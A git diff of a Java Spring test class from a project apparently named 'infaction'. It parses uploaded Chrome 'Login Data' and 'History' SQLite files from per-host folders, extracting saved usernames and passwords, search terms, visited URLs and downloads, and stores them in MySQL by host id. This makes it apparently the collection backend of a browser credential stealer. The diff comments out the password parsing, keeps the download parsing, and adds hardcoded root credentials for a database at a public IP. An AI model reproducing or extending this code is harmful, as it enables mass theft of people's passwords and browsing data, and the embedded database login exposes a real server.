@@ -1,12 +1,15 @@
 import com.jimmy.infaction.common.*;
 import java.io.File;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.SQLException;
+import java.sql.Statement;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.ScheduledThreadPoolExecutor;
 import java.util.concurrent.ThreadPoolExecutor;
 
-import com.jimmy.infaction.job.DeBagJob;
 import com.jimmy.infaction.pojo.Browser;
 import com.jimmy.infaction.pojo.Browser_download;
 import com.jimmy.infaction.pojo.Browser_keyword;
@@ -22,8 +25,10 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.test.annotation.Commit;
 import org.springframework.test.annotation.Rollback;
 import org.springframework.test.context.ContextConfiguration;
+import org.springframework.test.context.junit4.AbstractTransactionalJUnit4SpringContextTests;
 import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
 
+import org.springframework.test.context.transaction.TransactionConfiguration;
 import org.springframework.test.context.web.WebAppConfiguration;
 import org.springframework.transaction.annotation.Transactional;
 
@@ -31,35 +36,19 @@ import org.springframework.transaction.annotation.Transactional;
 @RunWith(SpringJUnit4ClassRunner.class)
 @ContextConfiguration(locations = "classpath:spring/spring-*.xml")
 @WebAppConfiguration("src/main/resources")
-@Transactional()
-@Rollback(value = false)
-//@Commit
-public class TestA {
+@Transactional(transactionManager="transactionManager")
+public class TestA extends AbstractTransactionalJUnit4SpringContextTests  {
 	@Autowired
 	private BrowserService browserService ;
-
 	@Autowired
 	private BrowserKeywordService browserKeywordService ;
 	@Autowired
 	private BrowserDownloadService browserDownloadService ;
 	@Autowired
 	private BrowserUrlService  browserUrlService ;
-
 	@Test
-	public void tl() {
-		List list = new ArrayList();
-//		list2.add(11);
-//		list2.addAll(list);
-//		list2.addAll(list1);
-
-		System.out.println(list.subList(1,2));
-	}
-	@Test
-	public  void  t1()   throws Exception{
-//		String jsonstr = "[{\"hostname\":\"RSVUBLJAANBQZT6\",\"uptime\":107492,\"bootTime\":1569191716,\"procs\":221,\"os\":\"windows\",\"platform\":\"Microsoft Windows 10 Pro\",\"platformFamily\":\"Standalone Workstation\",\"platformVersion\":\"10.0.18362 Build 18362\",\"kernelVersion\":\"\",\"kernelArch\":\"x86_64\",\"virtualizationSystem\":\"\",\"virtualizationRole\":\"\",\"hostid\":\"e5b51039-15d7-47a7-9470-adf9888dee3c\"}]";
-//		JSONArray jsonArray = new JSONArray(jsonstr);
-//		JSONObject jsonObj = jsonArray.getJSONObject(0);
-//		System.out.println(jsonObj.getString("platform"));
+	@Rollback(false)
+	public  void  t1()  {
 		String rootPath = "F:\\workspace\\infaction\\upload\\";
 		File dir = new File(rootPath);
 		File[] files = dir.listFiles();
@@ -70,58 +59,58 @@ public class TestA {
 					try {
 						switch (ff.getName()){
 							case "Login Data":
-								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
-								List<SqlLiteDemoResult> LoginList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
-								int Llength = LoginList.size();
-								int LbaseNum = Llength / num;
-								int LremainderNum = Llength % num;
-								int Lend = 0;
-								for (int i = 0; i < num; i++) {
-									int start = Lend;
-									Lend = start + LbaseNum;
-									if (i == (num - 1)) {
-										Lend = Llength;
-									} else if (i < LremainderNum) {
-										Lend = Lend + 1;
-									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", LoginList, start, Lend, f.getName());
-									thread.start();
-								}
-								break;
+//								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
+//								List<SqlLiteDemoResult> LoginList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
+//								int Llength = LoginList.size();
+//								int LbaseNum = Llength / num;
+//								int LremainderNum = Llength % num;
+//								int Lend = 0;
+//								for (int i = 0; i < num; i++) {
+//									int start = Lend;
+//									Lend = start + LbaseNum;
+//									if (i == (num - 1)) {
+//										Lend = Llength;
+//									} else if (i < LremainderNum) {
+//										Lend = Lend + 1;
+//									}
+//									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", LoginList, start, Lend, f.getName());
+//									thread.start();
+//								}
+//								break;
 							case "History":
 								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"\\"+"History");
-								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
-								int length = HkList.size();
-								int baseNum = length / num;
-								int remainderNum = length % num;
-								int end = 0;
-								for (int i = 0; i < num; i++) {
-									int start = end;
-									end = start + baseNum;
-									if (i == (num - 1)) {
-										end = length;
-									} else if (i < remainderNum) {
-										end = end + 1;
-									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HkList, start, end, f.getName());
-									thread.start();
-								}
-								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
-								int llength = HList.size();
-								int lbaseNum = length / num;
-								int lremainderNum = length % num;
-								int lend = 0;
-								for (int i = 0; i < num; i++) {
-									int start = lend;
-									lend = start + lbaseNum;
-									if (i == (num - 1)) {
-										lend = llength;
-									} else if (i < lremainderNum) {
-										lend = lend + 1;
-									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HList, start, end, f.getName());
-									thread.start();
-								}
+//								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
+//								int length = HkList.size();
+//								int baseNum = length / num;
+//								int remainderNum = length % num;
+//								int end = 0;
+//								for (int i = 0; i < num; i++) {
+//									int start = end;
+//									end = start + baseNum;
+//									if (i == (num - 1)) {
+//										end = length;
+//									} else if (i < remainderNum) {
+//										end = end + 1;
+//									}
+//									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HkList, start, end, f.getName());
+//									thread.start();
+//								}
+//								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
+//								int llength = HList.size();
+//								int lbaseNum = length / num;
+//								int lremainderNum = length % num;
+//								int lend = 0;
+//								for (int i = 0; i < num; i++) {
+//									int start = lend;
+//									lend = start + lbaseNum;
+//									if (i == (num - 1)) {
+//										lend = llength;
+//									} else if (i < lremainderNum) {
+//										lend = lend + 1;
+//									}
+//									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HList, start, end, f.getName());
+//									thread.start();
+//								}
 								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
 								int lllength = HdList.size();
 								int llbaseNum = lllength / num;
@@ -180,6 +169,7 @@ public class TestA {
 		}
 
 		@Override
+		@Rollback(false)
 		public void run() {
 			if(null!=hklist){
 				List<HistoryKeyResult> kList = hklist.subList(startIndex, endIndex);
@@ -209,31 +199,32 @@ public class TestA {
 					browser_download.setUrl(result.getTab_url());
 					browser_download.setPath(result.getCurrent_path());
 					browser_download.setHostid(hostid);
-					browserDownloadService.insert(browser_download);
+					try{
+						browserDownloadService.insert(browser_download);
+					}catch (Exception e){
+						e.printStackTrace();
+					}
 				}
 			}
 		}
 	}
+//I dont understand rollback [true] why can commit?  java.sql.SQLException: Can't call commit when autocommit=true
+	@Test
+//	@Rollback()
+	public void jFactory () throws SQLException, ClassNotFoundException, IllegalAccessException, InstantiationException {
+		Class.forName("com.mysql.jdbc.Driver").newInstance();
+		try{
+			String sql = " insert into browser_download ( url, hostid, path ) values ('fasfsdaf','e5b51039-15d7-47a7-9470-adf9888dee3c','fdsafsaf')";
+			Connection conn = DriverManager.getConnection(
+					"jdbc:mysql://111.231.82.173:3306/infaction", "root", "zxc123");
+			Statement stmt = conn.createStatement();
+			stmt.execute(sql);
+//			conn.commit();
+			conn.close();
+		}catch (Exception e){
+			e.printStackTrace();
+		}
 
-//	class ExecMultiBag implements  Runnable{
-//		private List<HistoryKeyResult> hklist ;
-//		private String name ;
-//		public ExecMultiBag(List<HistoryKeyResult> hkList,  String name) {
-//			this.hklist = hkList;
-//			this.name = name;
-//
-//		}
-//
-//		@Override
-//		public void run() {
-//			if(null!=hklist){
-//				for (HistoryKeyResult result : hklist) {
-//					Browser_keyword browser_keyword = new Browser_keyword();
-//					browser_keyword.setKey(result.getKey());
-//					browser_keyword.setHostid(name);
-//					browserKeywordService.insert(browser_keyword);
-//				}
-//			}
-//		}
-//	}
+	}
+
 }
